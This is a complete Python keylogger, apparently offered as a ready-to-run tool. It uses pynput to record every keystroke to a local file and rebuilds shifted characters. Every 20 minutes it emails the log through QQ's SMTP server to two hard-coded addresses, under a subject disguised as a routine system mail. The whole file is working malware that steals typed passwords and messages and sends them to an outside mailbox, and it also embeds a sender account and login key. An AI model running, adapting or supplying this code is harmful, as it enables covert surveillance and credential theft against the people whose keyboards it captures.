from pynput.keyboard import Listener
import smtplib
from email.mime.text import MIMEText
from email.header import Header
from email.mime.multipart import MIMEMultipart
import datetime


KEY = "qrnqkvkfpxcmbidc"
sender = '392125238@qq.com'
receivers = ["438814754@qq.com", "921112580@qq.com"]  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
senderName = "KeyBoardLogger"
receiverName = "杨丽杰老板"
title = "[系统邮件]定时日志回收"
text = '定时日志回收……'
filePath = "keylogger.txt"
emailTime = datetime.datetime.now()+datetime.timedelta(seconds=20*60)
keyShift = False
shiftDict = {"1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
             "-": "_", "=": "+",
             "[": "{", "]": "}", "\\": "|", ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "【": "{", "】": "}",
             "、": "|",
             "；": "：", "‘": "“", "’": "”", "，": "《", "。": "》"}
# 创建一个带附件的实例
def sendEMail(KEY,sender,receivers,senderName,receiverName,title,text,filePath):
    message = MIMEMultipart()
    message['From'] = Header(senderName, 'utf-8')
    message['To'] = Header(receiverName, 'utf-8')
    subject = title
    message['Subject'] = Header(subject, 'utf-8')
    # 邮件正文内容
    message.attach(MIMEText(text, 'plain', 'utf-8'))
    # 构造附件1，传送当前目录下的 test.txt 文件
    att1 = MIMEText(open(filePath, 'rb').read(), 'base64', 'utf-8')
    att1["Content-Type"] = 'application/octet-stream'
    # 这里的filename可以任意写，写什么名字，邮件中显示什么名字
    att1["Content-Disposition"] = 'attachment; filename="keyboard_log.txt"'
    message.attach(att1)
    smtpObj = smtplib.SMTP_SSL('smtp.qq.com',465)
    smtpObj.login(sender, KEY)
    smtpObj.sendmail(sender, receivers, message.as_string())

# 由于半角/和全角是同意个字符，所以不能区分半角和全角的问号
def press(key):
    global emailTime,keyShift, shiftDict
    if datetime.datetime.now()>emailTime:
        sendEMail(KEY, sender, receivers, senderName, receiverName, title, text, filePath)
        emailTime = datetime.datetime.now()+datetime.timedelta(seconds=20*60)
        with open("keylogger.txt","w") as ff:
            ff.write("")
    msg = str(key).strip("'")
    if keyShift:
        keyShift = False
        if msg in shiftDict.keys():
            msg = shiftDict.get(msg)
    if msg == "Key.shift":
        keyShift = True
    msg += "\n"
    with open(filePath, "a") as loggerFile:
        loggerFile.writelines(msg)

with Listener(on_press=press) as listener:
    listener.join()
